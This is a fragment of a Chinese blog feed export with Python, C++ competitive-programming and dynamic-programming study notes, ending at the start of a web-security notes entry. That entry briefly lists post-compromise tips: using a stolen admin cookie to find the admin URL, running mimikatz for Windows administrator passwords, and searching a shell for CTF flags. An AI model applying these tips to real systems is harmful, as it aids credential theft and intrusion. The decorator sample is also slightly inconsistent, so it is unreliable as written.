j</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        r = f(i)</span><br><span class="line">        fs.append(r)</span><br><span class="line">  <span class="keyword">return</span> fs</span><br></pre></td></tr></table></figure><h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p>需要一个函数，又懒得特地声明，此时就可以用<code>lambda</code>表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arr = range(<span class="number">5</span>)</span><br><span class="line">print(map(<span class="keyword">lambda</span> x: x*x, arr))<span class="comment"># 每个元素都平方一下</span></span><br><span class="line">print(filter(<span class="keyword">lambda</span> x: x%<span class="number">2</span>==<span class="number">0</span>, arr))<span class="comment"># 挑出偶数</span></span><br></pre></td></tr></table></figure><h4 id="装饰器-decorator"><a href="#装饰器-decorator" class="headerlink" title="装饰器(decorator)"></a>装饰器(decorator)</h4><p>不改动原函数代码，在代码运行期间动态扩展原函数功能的一种机制。</p><p>实际上，装饰器就是一个返回函数的高阶函数（接收函数 -&gt; 包装 -&gt; 返回新函数）</p><p>使用方法：@+函数名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以极大地简化代码，避免每个函数写重复的代码</span></span><br><span class="line"><span class="meta">@log# 打印日志</span></span><br><span class="line"><span class="meta">@performance# 检测性能</span></span><br><span class="line"><span class="meta">@transaction# 数据库事务</span></span><br><span class="line"><span class="meta">@post('/register')# URL路由</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">print(<span class="string">"Hello, World!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加功能：输出函数运行耗费的时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">metric</span><span class="params">(fn)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">weapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        start = time.time()</span><br><span class="line">        res = fn(*args, **kwargs)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">'%s executed in %s ms'</span> % (fn.__name__, end - start))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> weapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@printTime</span></span><br><span class="line">hello()</span><br></pre></td></tr></table></figure><h4 id="偏函数"><a href="#偏函数" class="headerlink" title="偏函数"></a>偏函数</h4><p>偏函数的意义在于固定某些可变参数，相当于“减饰器”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># int() 可以把字符串转换为整数，但它还额外提供了 base参数，其默认值为10</span></span><br><span class="line"><span class="comment"># 如果传入 base参数，就可以做 N 进制转换</span></span><br><span class="line"><span class="comment"># 假设要转换大量二进制字符串，每次都传入int(x, base=2)非常麻烦，那么就可以定一个int2()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2</span><span class="params">(x, base=<span class="number">2</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(x, base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># functools.partial就是帮助我们创建这样一个偏函数的，不用自己特意定义int2()</span></span><br><span class="line">int2 = functools.partial(int, base=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 可能出问题的代码</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> 错误类型<span class="number">1</span>:</span><br><span class="line">    <span class="comment"># 针对错误类型1进行处理的代码</span></span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> 错误类型<span class="number">2</span>:</span><br><span class="line">    <span class="comment"># 针对错误类型2进行处理的代码</span></span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">    <span class="comment"># 未知错误</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 正常情况该执行的代码</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="comment"># 无论是否有异常，都会执行的代码</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异常的传递——当函数/方法执行出现异常，会讲异常传递给函数/方法的调用一方</span></span><br><span class="line">若果传递到主程序，仍然没有异常处理，程序才会被终止</span><br><span class="line">在开发中，可以利用异常的传递性，在主程序捕获异常</span><br><span class="line">而在主函数中调用的其他函数，只要出现异常，都会传递到主函数的异常捕获中</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主动抛出异常</span></span><br><span class="line"><span class="number">1.</span>创建一个Exception的对象</span><br><span class="line">    <span class="number">2.</span>使用<span class="keyword">raise</span>关键字抛出异常对象</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 样例：密码长度小于8则异常</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_passwd</span><span class="params">()</span>:</span></span><br><span class="line">    pwd = input(<span class="string">"请输入密码："</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> len(pwd) &gt;= <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> pwd</span><br><span class="line">    print(<span class="string">"主动抛出异常"</span>)</span><br><span class="line">    <span class="comment"># 创建对象</span></span><br><span class="line">    ex = Exception(<span class="string">"密码长度不够"</span>)</span><br><span class="line">    <span class="comment"># 主动抛出异常</span></span><br><span class="line">    <span class="keyword">raise</span> ex</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(input_passwd())</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><h2 id="ACM-Tricks"><a href="#ACM-Tricks" class="headerlink" title="ACM Tricks"></a>ACM Tricks</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#123;&#123;&#123; #include</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;complex&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;bits/stdc++.h&gt;</span></span><br><span class="line"><span class="comment">//&#125;&#125;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">double</span> ld;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> db;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vi;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mp make_pair</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fi first</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> se second</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sf scanf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pf printf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pn printf(<span class="meta-string">"\n"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ls l,mid,rt&lt;&lt;1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rs mid+1,r,rt&lt;&lt;1|1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pb push_back</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> all(x) (x).begin(),(x).end()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> de(x) cout &lt;&lt; #x &lt;&lt; <span class="meta-string">"="</span> &lt;&lt; x &lt;&lt; endl</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> dd(x) cout&lt;&lt; #x&lt;&lt;<span class="meta-string">" = "</span>&lt;&lt;x&lt;&lt;<span class="meta-string">" "</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i,a,b) for(int i=a;i&lt;(b);++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> per(i,a,n) for (int i=n-1;i&gt;=a;i--)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem(a,b) memset(a,b,sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sz(x) (int)(x).size()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF=<span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps=<span class="number">1e-8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> PI=<span class="built_in">acos</span>(<span class="number">-1.0</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sgn</span><span class="params">(<span class="keyword">double</span> x)</span></span>&#123;<span class="keyword">if</span>(<span class="built_in">fabs</span>(x)&lt;eps)<span class="keyword">return</span> <span class="number">0</span>;<span class="keyword">if</span>(x&lt;<span class="number">0</span>)<span class="keyword">return</span> <span class="number">-1</span>;<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a,ll b)</span></span>&#123;<span class="keyword">return</span> b==<span class="number">0</span>?a:gcd(b,a%b);&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fast-pow</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Pow</span><span class="params">(ll x,ll t,<span class="keyword">int</span> p)</span> </span>&#123;ll r=<span class="number">1</span>;<span class="keyword">for</span>(;t;t&gt;&gt;=<span class="number">1</span>,x=x*x%p)<span class="keyword">if</span>(t&amp;<span class="number">1</span>)r=r*x%p;<span class="keyword">return</span> r;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add-mod</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pp</span><span class="params">(<span class="keyword">int</span> &amp;x,<span class="keyword">int</span> d)</span> </span>&#123;<span class="keyword">if</span>((x+=d)&gt;=MOD) x-=MOD;&#125;</span><br><span class="line"><span class="comment">// minus-mod -&gt; pp(a , P - x);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// multiply-mod</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123; <span class="keyword">return</span> ll(a)*b%MOD;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inversion</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inverse</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> p)</span> </span>&#123;<span class="keyword">return</span> Pow(x,p<span class="number">-2</span>,p);&#125; <span class="comment">// p should be prime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// tree-dp</span></span><br><span class="line">vi g[N];</span><br><span class="line"><span class="keyword">int</span> sz[N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> c,<span class="keyword">int</span> par)</span></span>&#123;</span><br><span class="line">  sz[c] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> t : g[c]) <span class="keyword">if</span>(t != par)&#123; <span class="comment">// c++11</span></span><br><span class="line">    dfs(t , c);</span><br><span class="line">    sz[c] += sz[t];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// dsu</span></span><br><span class="line"><span class="keyword">int</span> fa[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123; <span class="keyword">return</span> fa[x] == x ? x : fa[x] = F(fa[x]);&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">M</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123; fa[F(x)] = F(y);&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// swap</span></span><br><span class="line">  <span class="keyword">int</span> u = <span class="number">0</span>, v = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::swap(u , v); <span class="comment">// swap</span></span><br><span class="line">  <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; A , B;</span><br><span class="line">  <span class="built_in">std</span>::swap(A , B); <span class="comment">// O(1)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// minimal &amp; maximal</span></span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">20</span>] , n = <span class="number">20</span>;</span><br><span class="line">  rep(i,<span class="number">0</span>,n) a[i] = i;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; *<span class="built_in">std</span>::max_element(a , a + n) &lt;&lt; <span class="built_in">endl</span>;<span class="comment">// [a , a+n)</span></span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; *<span class="built_in">std</span>::min_element(a , a + n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// discretization</span></span><br><span class="line">  vi V;<span class="comment">// about 10 int</span></span><br><span class="line">  sort(all(V));V.erase(unique(all(V)),V.end());</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rk(x) upper_bound(all(V) , x) - V.begin()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// deal with same value</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;sz(V);i=j) &#123;</span><br><span class="line">    <span class="keyword">for</span>(j=i;j&lt;sz(V)&amp;&amp;V[j]==V[i];++j);</span><br><span class="line">    <span class="comment">// Cal(i , j) //[i , j)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// multiple-loops</span></span><br><span class="line">  <span class="keyword">int</span> g[<span class="number">10</span>][<span class="number">10</span>] , m = <span class="number">10</span>;</span><br><span class="line">  rep(i,<span class="number">0</span>,m) rep(j,<span class="number">0</span>,m) <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;g[i][j]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// __builtin_popcount()</span></span><br><span class="line">  <span class="keyword">int</span> cnt1[<span class="number">1</span>&lt;&lt;<span class="number">6</span>];</span><br><span class="line">  rep(i,<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">6</span>) cnt1[i] = cnt1[i &gt;&gt; <span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sort</span></span><br><span class="line">  <span class="keyword">int</span> cnt[<span class="number">20</span>];</span><br><span class="line">  sort(all(V),[&amp;](<span class="keyword">int</span> a,<span class="keyword">int</span> b)&#123;<span class="keyword">return</span> cnt[a]&lt;cnt[b];&#125;); <span class="comment">// c++11 </span></span><br><span class="line">  <span class="built_in">vector</span>&lt;vi&gt; Vv;</span><br><span class="line">  sort(all(Vv));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sort with id</span></span><br><span class="line">  <span class="built_in">vector</span>&lt;pii&gt; p;</span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">20</span>) p.pb(mp(rand(),i));</span><br><span class="line">  sort(all(p));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// deal with subsets</span></span><br><span class="line">  rep(mask,<span class="number">0</span>,<span class="number">1</span>&lt;&lt;<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=mask;j;j=(j<span class="number">-1</span>)&amp;mask)</span><br><span class="line">      ;<span class="comment">// Cal</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// high-dimensional prefix-sum</span></span><br><span class="line">  <span class="keyword">int</span> f[<span class="number">1</span>&lt;&lt;<span class="number">10</span>];</span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">10</span>) rep(j,<span class="number">0</span>,<span class="number">1</span>&lt;&lt;<span class="number">10</span>) <span class="keyword">if</span>(j&gt;&gt;i&amp;<span class="number">1</span>) pp(f[j],f[j^(<span class="number">1</span>&lt;&lt;i)]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// permutation</span></span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">7</span>) a[i] = i;</span><br><span class="line">  <span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="comment">// Cal;</span></span><br><span class="line">  &#125;<span class="keyword">while</span>(next_permutation(a , a + <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fill function</span></span><br><span class="line">  <span class="built_in">std</span>::fill(a , a + <span class="number">20</span> , <span class="number">0</span>);<span class="comment">// fill any number</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// reference</span></span><br><span class="line">  <span class="keyword">int</span> &amp;r=f[<span class="number">10</span>];</span><br><span class="line">  rep(i,<span class="number">0</span>,<span class="number">10</span>) r+=i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ternary operator</span></span><br><span class="line">  <span class="keyword">int</span> C[<span class="number">10</span>][<span class="number">10</span>] = &#123;&#123;<span class="number">1</span>&#125;&#125;;</span><br><span class="line">  rep(i,<span class="number">1</span>,<span class="number">10</span>) rep(j,<span class="number">0</span>,i+<span class="number">1</span>) C[i][j] = j ? (C[i<span class="number">-1</span>][j<span class="number">-1</span>] + C[i<span class="number">-1</span>][j]) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dynamic-Programing"><a href="#Dynamic-Programing" class="headerlink" title="Dynamic Programing"></a><em>Dynamic Programing</em></h2><ul><li><p>第一。先找到原问题和其子问题们之间的关系，写出递归形式。如此一来，便可利用递归公式，用子子问题的答案求出子问题的解；用子问题的解，求出原问题的解。</p></li><li><p>第二。确认可能出现的问题总共有哪些，这样才能知道要计算哪些问题，才能知道总共花多少时间、多少记忆体。</p></li><li>第三。有了递归公式之后，就必须安排一套计算的顺序。大问题的答案，总是以小问题的答案来求得的，所以，小问题的答案必须先计算，否则大问题的答案从何而来？一个好的安排，不但使程序容易编写，还可重复利用记忆体空间。</li><li>第四。记得先捋最小、最先被计算的问题，心算出答案，储存入表格，内建于程序中。一道递归公式必须拥有初始值，才有办法计算其他项。</li><li>第五。实践 $DP$ 的程序时，会建立一个表格，在表格存入所有大小问题的答案。安排好每个问题在表格的位置，这样计算时才能知道在哪取值。切勿存取超出表格的元素，产生溢出情形，导致答案算错。计算过程当中，一旦某个问题的答案出错，就会如同多米诺骨牌效应般影响整体，造成很难除错。</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul><li>线性dp</li><li>背包</li><li>区间dp</li><li>数位dp</li><li>状压dp</li><li>树形dp</li><li>概率dp</li></ul><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ul><li>序列型</li><li>背包型</li><li>区间型</li><li>环形</li><li>棋盘型</li><li>普通多维</li></ul><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><ul><li>复杂多维</li><li>多线程</li><li>数位</li><li>期望</li><li>状压基础</li></ul><h3 id="高级"><a href="#高级" class="headerlink" title="高级"></a>高级</h3><ul><li>树形</li><li>$DP$ 优化</li><li>状压进阶</li><li>插头</li><li>博弈论</li><li>$DP$ 套 $DP$</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Scala&quot;&gt;&lt;a href=&quot;#Scala&quot; class=&quot;headerlink&quot; title=&quot;Scala&quot;&gt;&lt;/a&gt;Scala&lt;/h2&gt;&lt;p&gt;官网 、源码&lt;/p&gt;
&lt;p&gt;安装 &lt;a href=&quot;https://downloads.lightbend.com/
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://wywwzjj.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Web 安全笔记</title>
    <link href="https://wywwzjj.top/2018/01/26/Web%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    <id>https://wywwzjj.top/2018/01/26/Web安全笔记/</id>
    <published>2018-01-26T06:10:17.000Z</published>
    <updated>2019-03-01T01:38:09.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="每天学点新东西"><a href="#每天学点新东西" class="headerlink" title="每天学点新东西"></a>每天学点新东西</h2><p>如果拿到了管理员 <code>cookie</code>，可通过 <code>window.location.href</code> 拿到后台 <code>URL</code></p><p>win-server 拿到权限后可通过 <code>mimikatz</code> 获得管理员密码</p><p>GitHub ：webdirscan weakfilescan bbscan</p><p>有几个同学在问CTF里flag怎么找，因为比较基础所以我没讲过。<br>拿到shell以后，如何找flag？其实这也是实际安全测试中的一个问题：拿到shell后，如何找一些敏感信息，从而辅助后续渗透。<br>拿code-breaking puzzles举例，首先查看官网的说明：<a href="https://code-breaking.com/intro/" target="_blank" rel="noopener">代码审计知识星球二周年 &amp;&amp; Code-Breaking Puzzles</a> ，里面明确写了flag的格式是“flag{some_thing}”（图1）<br>那么我的目标就是，拿到shell以后在系统上找包含了这个格式的内容，这个内容可能是文件名、文件内容，甚至是数据库里的内容。<br>首先我肯定是在文件里找，如grep：<br>grep -r ‘flag{.<em>}’ .<br>还有一些其他方法，比如有的flag是写在文件里的，我就可以找包含了flag这个关键词的文件名：find / -name “</em>flag*”<br>当然，如果是php的题，不一定能拿到系统的shell。如果拿到的是webshell，也可以用php的scandir、glob等函数来遍历目录，查找flag。（参考 <a href="https://www.cnblogs.com/CheeseZH/p/4560602.html" target="_blank" rel="noopener">ZH奶酪：PHP遍历目录/文件的3种方法 - ZH奶酪 - 博客园</a> ）</p><h3 id="CMS-至少自己会搭建"><a href="#CMS-至少自己会搭建" class="headerlink" title="CMS 至少自己会搭建"></a>CMS 至少自己会搭建</h3><p>CMS部分搭建，框架部分随便写点什么玩意</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 